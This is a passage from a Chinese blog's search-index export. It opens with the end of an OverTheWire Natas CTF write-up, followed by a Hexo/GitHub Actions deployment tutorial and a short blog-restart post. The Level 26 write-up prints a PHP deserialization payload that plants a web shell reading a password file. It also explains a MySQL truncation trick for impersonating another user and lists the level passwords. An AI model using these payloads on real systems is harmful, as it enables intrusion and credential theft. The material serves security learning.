class="variable">$_GET</span>[<span class="string">&quot;y1&quot;</span>], </span><br><span class="line">                            <span class="variable">$_GET</span>[<span class="string">&quot;x2&quot;</span>], <span class="variable">$_GET</span>[<span class="string">&quot;y2&quot;</span>], <span class="variable">$color</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;drawing&quot;</span>, <span class="variable">$_COOKIE</span>))&#123;</span><br><span class="line">            <span class="variable">$drawing</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;drawing&quot;</span>]));</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$drawing</span>)</span><br><span class="line">                <span class="keyword">foreach</span>(<span class="variable">$drawing</span> <span class="keyword">as</span> <span class="variable">$object</span>)</span><br><span class="line">                    <span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;x1&quot;</span>, <span class="variable">$object</span>) &amp;&amp; </span><br><span class="line">                        <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;y1&quot;</span>, <span class="variable">$object</span>) &amp;&amp;</span><br><span class="line">                        <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;x2&quot;</span>, <span class="variable">$object</span>) &amp;&amp; </span><br><span class="line">                        <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;y2&quot;</span>, <span class="variable">$object</span>))&#123;</span><br><span class="line">                    </span><br><span class="line">                        <span class="variable">$color</span>=<span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>,<span class="number">0xff</span>,<span class="number">0x12</span>,<span class="number">0x1c</span>);</span><br><span class="line">                        <span class="title function_ invoke__">imageline</span>(<span class="variable">$img</span>,<span class="variable">$object</span>[<span class="string">&quot;x1&quot;</span>],<span class="variable">$object</span>[<span class="string">&quot;y1&quot;</span>],</span><br><span class="line">                                <span class="variable">$object</span>[<span class="string">&quot;x2&quot;</span>] ,<span class="variable">$object</span>[<span class="string">&quot;y2&quot;</span>] ,<span class="variable">$color</span>);</span><br><span class="line">            </span><br><span class="line">                    &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">storeData</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$new_object</span>=<span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;x1&quot;</span>, <span class="variable">$_GET</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;y1&quot;</span>, <span class="variable">$_GET</span>) &amp;&amp;</span><br><span class="line">            <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;x2&quot;</span>, <span class="variable">$_GET</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;y2&quot;</span>, <span class="variable">$_GET</span>))&#123;</span><br><span class="line">            <span class="variable">$new_object</span>[<span class="string">&quot;x1&quot;</span>]=<span class="variable">$_GET</span>[<span class="string">&quot;x1&quot;</span>];</span><br><span class="line">            <span class="variable">$new_object</span>[<span class="string">&quot;y1&quot;</span>]=<span class="variable">$_GET</span>[<span class="string">&quot;y1&quot;</span>];</span><br><span class="line">            <span class="variable">$new_object</span>[<span class="string">&quot;x2&quot;</span>]=<span class="variable">$_GET</span>[<span class="string">&quot;x2&quot;</span>];</span><br><span class="line">            <span class="variable">$new_object</span>[<span class="string">&quot;y2&quot;</span>]=<span class="variable">$_GET</span>[<span class="string">&quot;y2&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;drawing&quot;</span>, <span class="variable">$_COOKIE</span>))&#123;</span><br><span class="line">            <span class="variable">$drawing</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;drawing&quot;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// create new array</span></span><br><span class="line">            <span class="variable">$drawing</span>=<span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$drawing</span>[]=<span class="variable">$new_object</span>;</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;drawing&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$drawing</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可利用的是反序列化，构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Logger</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$logFile</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$initMsg</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exitMsg</span>;</span><br><span class="line">      </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;initMsg=<span class="string">&quot;&lt;?php echo file_get_contents(&#x27;/etc/natas_webpass/natas27&#x27;);?&gt;\n&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exitMsg=<span class="string">&quot;&lt;?php echo file_get_contents(&#x27;/etc/natas_webpass/natas27&#x27;);?&gt;\n&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logFile = <span class="string">&quot;img/ttt.php&quot;</span>;</span><br><span class="line">        &#125;                              </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="string">&#x27;a.php&#x27;</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>替换Cookie中的drawing字段值，然后访问 <code>img/ttt.php</code> 即可得到下一关密码</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211163741465.png" alt="image-20200211163741465"></p>
<h2 id="Level-27"><a href="#Level-27" class="headerlink" title="Level 27"></a>Level 27</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ </span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考链接：<a href="https://www.cnblogs.com/liqiuhao/p/6906474.html">https://www.cnblogs.com/liqiuhao/p/6906474.html</a></p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line"></span><br><span class="line">// morla / 10111</span><br><span class="line">// database gets cleared every 5 min </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">CREATE TABLE `users` (</span><br><span class="line">  `username` varchar(64) DEFAULT NULL,</span><br><span class="line">  `password` varchar(64) DEFAULT NULL</span><br><span class="line">);</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function checkCredentials($link,$usr,$pass)&#123;</span><br><span class="line"> </span><br><span class="line">    $user=mysql_real_escape_string($usr);</span><br><span class="line">    $password=mysql_real_escape_string($pass);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;SELECT username from users where username=&#x27;$user&#x27; and password=&#x27;$password&#x27; &quot;;</span><br><span class="line">    SELECT username from users where username=&#x27;natas28&#x27; and password=&#x27;&#x27; </span><br><span class="line">    $res = mysql_query($query, $link);</span><br><span class="line">    if(mysql_num_rows($res) &gt; 0)&#123;</span><br><span class="line">        return True;</span><br><span class="line">    &#125;</span><br><span class="line">    return False;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function validUser($link,$usr)&#123;</span><br><span class="line">    </span><br><span class="line">    $user=mysql_real_escape_string($usr);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;SELECT * from users where username=&#x27;$user&#x27;&quot;;</span><br><span class="line">    $res = mysql_query($query, $link);</span><br><span class="line">    if($res) &#123;</span><br><span class="line">        if(mysql_num_rows($res) &gt; 0) &#123;</span><br><span class="line">            return True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return False;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function dumpData($link,$usr)&#123;</span><br><span class="line">    </span><br><span class="line">    $user=mysql_real_escape_string($usr);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;SELECT * from users where username=&#x27;$user&#x27;&quot;;</span><br><span class="line">    $res = mysql_query($query, $link);</span><br><span class="line">    if($res) &#123;</span><br><span class="line">        if(mysql_num_rows($res) &gt; 0) &#123;</span><br><span class="line">            while ($row = mysql_fetch_assoc($res)) &#123;</span><br><span class="line">                // thanks to Gobo for reporting this bug!  </span><br><span class="line">                //return print_r($row);</span><br><span class="line">                return print_r($row,true);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return False;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function createUser($link, $usr, $pass)&#123;</span><br><span class="line"></span><br><span class="line">    $user=mysql_real_escape_string($usr);</span><br><span class="line">    $password=mysql_real_escape_string($pass);</span><br><span class="line">    </span><br><span class="line">    $query = &quot;INSERT INTO users (username,password) values (&#x27;$user&#x27;,&#x27;$password&#x27;)&quot;;</span><br><span class="line">    $res = mysql_query($query, $link);</span><br><span class="line">    if(mysql_affected_rows() &gt; 0)&#123;</span><br><span class="line">        return True;</span><br><span class="line">    &#125;</span><br><span class="line">    return False;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(array_key_exists(&quot;username&quot;, $_REQUEST) and array_key_exists(&quot;password&quot;, $_REQUEST)) &#123;</span><br><span class="line">    $link = mysql_connect(&#x27;localhost&#x27;, &#x27;natas27&#x27;, &#x27;<span class="tag">&lt;<span class="name">censored</span>&gt;</span>&#x27;);</span><br><span class="line">    mysql_select_db(&#x27;natas27&#x27;, $link);</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    if(validUser($link,$_REQUEST[&quot;username&quot;])) &#123;</span><br><span class="line">        //user exists, check creds</span><br><span class="line">        if(checkCredentials($link,$_REQUEST[&quot;username&quot;],$_REQUEST[&quot;password&quot;]))&#123;</span><br><span class="line">            echo &quot;Welcome &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot;!<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">            echo &quot;Here is your data:<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">            $data=dumpData($link,$_REQUEST[&quot;username&quot;]);</span><br><span class="line">            print htmlentities($data);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &quot;Wrong password for user: &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&quot;;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123;</span><br><span class="line">        //user doesn&#x27;t exist</span><br><span class="line">        if(createUser($link,$_REQUEST[&quot;username&quot;],$_REQUEST[&quot;password&quot;]))&#123; </span><br><span class="line">            echo &quot;User &quot; . htmlentities($_REQUEST[&quot;username&quot;]) . &quot; was created!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close($link);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;login&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&lt;? &#125; ?&gt; </span><br></pre></td></tr></table></figure>

<p>MySQL 中：</p>
<ol>
<li>字符串<strong>存储时</strong>若发生“溢出”，mysql会自动truncate到最大宽度。</li>
<li>空格在varchar里面会被自动删除。</li>
</ol>
<p>思路：</p>
<ul>
<li>注册一个新用户，用户名是 natas28 后拼接很多空格（超过64字节）再拼接任意字符，密码随便写，造成字符串存储时的”溢出”, 经过数据库去除空格后用户名就会变成 natas28</li>
<li>使用 natas28 和刚刚设置的密码登录</li>
</ul>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200212184943145.png" alt="image-20200212184943145"></p>
<h2 id="Level-28"><a href="#Level-28" class="headerlink" title="Level 28"></a>Level 28</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">JWwR438wkgTsNKBbcJoowyysdM82YjeF</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo 博客自动化部署</title>
    <url>/2023/07/07/auto-hexo/</url>
    <content><![CDATA[<h1 id="使用-Github-Actions-自动化部署-Hexo-博客"><a href="#使用-Github-Actions-自动化部署-Hexo-博客" class="headerlink" title="使用 Github Actions 自动化部署 Hexo 博客"></a>使用 Github Actions 自动化部署 Hexo 博客</h1><p>环境信息:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo: 6.3.0</span><br><span class="line">hexo-cli: 4.3.0</span><br><span class="line">os: darwin 22.5.0 13.4.1</span><br><span class="line">node: 20.3.0</span><br></pre></td></tr></table></figure>

<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>首先最基本的：</p>
<ol>
<li>会用 Git 以及 Github (废话)</li>
<li>会用 Hexo 搭建博客 🤔<ul>
<li>头一次用 Hexo 也问题不大，<a href="https://hexo.io/zh-cn/docs/">官方文档</a>写的很详细，照着操作就会了</li>
<li>重点关注如何修改配置文件<ul>
<li><code>_config.yml</code> (hexo 配置文件: 看<a href="https://hexo.io/zh-cn/docs/configuration">官方文档</a>)</li>
<li><code>_config.xxxx.yml</code> (xxxx主题的配置文件: 看对应主题的文档, 例如正在用的 <a href="https://theme-next.js.org/docs/theme-settings/">NexT</a>)</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="1-Github-创建仓库"><a href="#1-Github-创建仓库" class="headerlink" title="1. Github 创建仓库"></a>1. Github 创建仓库</h3><p>Github 创建两个仓库：</p>
<ul>
<li>一个 Public 仓库<ul>
<li>用于存放build后的博客静态网页</li>
<li>名称随意<ul>
<li>注意如果使用 <code>用户名.github.io</code> 为仓库名可以无需加仓库名路径访问</li>
<li>如果仓库名为 <code>blog</code>, 则需要通过 <code>用户名.github.io/blog</code> 访问</li>
<li>这里以 <code>用户名.github.io</code> 为例</li>
</ul>
</li>
</ul>
</li>
<li>一个 Private 仓库<ul>
<li>用来存放文章源码</li>
<li>名称随意，以 <code>blog-source</code> 为例</li>
</ul>
</li>
</ul>
<p>实现目标是更新 Private 仓库数据时会使用 Github Actions 自动 build 博客内容并部署到指定的 Public 仓库中</p>
<h3 id="2-创建-Github-Token"><a href="#2-创建-Github-Token" class="headerlink" title="2. 创建 Github Token"></a>2. 创建 Github Token</h3><ul>
<li>如何创建? <ul>
<li>答: 看<a href="https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens#creating-a-personal-access-token-classic">官方文档</a></li>
<li>Note 内容随意, 自己知道用于自动化部署博客即可</li>
<li>Select scopes 部分选择 <code>repo</code> 和 <code>workflow</code> 权限</li>
</ul>
</li>
<li>注意 <ul>
<li>创建的是 <code>Personal access tokens (classic)</code></li>
<li>Token 创建完成后只显示一次, 及时复制</li>
<li>Token 有过期时间, 过期之后记得再次更新(当然这是后话)</li>
</ul>
</li>
</ul>
<h3 id="3-为-Private-仓库创建-secrets"><a href="#3-为-Private-仓库创建-secrets" class="headerlink" title="3. 为 Private 仓库创建 secrets"></a>3. 为 Private 仓库创建 secrets</h3><ul>
<li>如何创建?<ul>
<li>答: 还是看<a href="https://docs.github.com/en/actions/security-guides/encrypted-secrets#creating-encrypted-secrets-for-a-repository">官方文档</a></li>
<li>Name 还是随意, 这里以 <code>DEPLOY_TOKEN</code> 为例</li>
<li>Secret 内容填写上一步生成的 Token</li>
</ul>
</li>
</ul>
<h3 id="4-创建-Github-Actions-配置文件"><a href="#4-创建-Github-Actions-配置文件" class="headerlink" title="4. 创建 Github Actions 配置文件"></a>4. 创建 Github Actions 配置文件</h3><ol>
<li>在 hexo 项目根目录的 <code>.github</code> 文件夹下创建一个名为 <code>workflows</code> 的文件夹</li>
<li>在刚刚创建的 <code>workflows</code> 文件夹下创建一个 <code>.yml</code> 类型文件，名称随意，这里以 <code>deploy.yml</code> 为例</li>
<li><code>deploy.yml</code> 内容大致如下:</li>
</ol>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">Deploy</span> <span class="string">GitHub</span> <span class="string">Pages</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="comment"># 只有当 master 分支进行 push 的时候执行下面的操作 (也就是当前Private仓库的分支)</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span> </span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build-and-deploy:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    </span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/checkout@master</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Build</span> <span class="string">and</span> <span class="string">Deploy</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">theme-keep/hexo-deploy-github-pages-action@master</span></span><br><span class="line">      <span class="attr">env:</span></span><br><span class="line">        <span class="comment"># 这里注意修改成上一步设置的 secrets 名称</span></span><br><span class="line">        <span class="attr">PERSONAL_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.DEPLOY_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># The repository the action should deploy to.</span></span><br><span class="line">        <span class="comment"># 这里是部署的目标仓库, 格式是Github用户名/一开始创建的 public 仓库名</span></span><br><span class="line">        <span class="attr">PUBLISH_REPOSITORY:</span> <span class="string">ex7l0it/ex7l0it.github.io</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># The branch the action should deploy to.</span></span><br><span class="line">        <span class="comment"># 要部署到的 public 仓库的分支名</span></span><br><span class="line">        <span class="attr">BRANCH:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
<p>这里使用的是 <code>theme-keep</code> 团队创建的 <a href="https://github.com/theme-keep/hexo-deploy-github-pages-action">https://github.com/theme-keep/hexo-deploy-github-pages-action</a> 仓库中的内容，Hexo博客通用, 不局限主题 👍🏻👍🏻👍🏻</p>
<blockquote>
<p>杂七杂八的话</p>
<ul>
<li>现在 Github 默认分支改成了main, 本人还是习惯用 master(可以在Github设置中更改默认分支名称)</li>
<li>如果需要将本地的 main 分支改名为 master 分支, 执行 <code>git branch -m main master</code> 即可</li>
</ul>
</blockquote>
<h3 id="5-完成"><a href="#5-完成" class="headerlink" title="5. 完成"></a>5. 完成</h3><ul>
<li>将 hexo 项目 push 到 Private 仓库即可触发自动化部署，可以在仓库的 Actions 页面看到 Workflows 的工作状态</li>
<li>Public 仓库中通过 Github Pages 访问即可</li>
</ul>
<h3 id="6-其他的好东西"><a href="#6-其他的好东西" class="headerlink" title="6. 其他的好东西"></a>6. 其他的好东西</h3><ul>
<li>扒拉半天才找到的能用的 <a href="https://u.sb/css-cdn/">前端 CDNJS 库及 Google Fonts、Ajax 和 Gravatar 国内加速服务</a>，可以用来修改主题默认字体</li>
</ul>
]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title>又双又叕重启更新Blog</title>
    <url>/2023/07/05/hello-world-again/</url>
    <content><![CDATA[<h1 id="假装是第一篇博客😅"><a href="#假装是第一篇博客😅" class="headerlink" title="假装是第一篇博客😅"></a>假装是第一篇博客😅</h1><ul>
<li>时隔不知道多久之后再一次燃起了发博客的激情，继 WordPress、Github+Hexo、语雀、Gitee+Hexo、Notion 换来换去之后再次回归 Github+Hexo<ul>
<li>继续犯选择困难症，博客主题纠结半天还得是经典的 Next</li>
</ul>
</li>
<li>先前写的内容质量实在是一言难尽，还是先整理整理这💩⛰再重发</li>
<li>主要还是记录一下整活的经验</li>
<li>博客佛系更新（主要还是懒）</li>
</ul>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
  </entry>
</search>
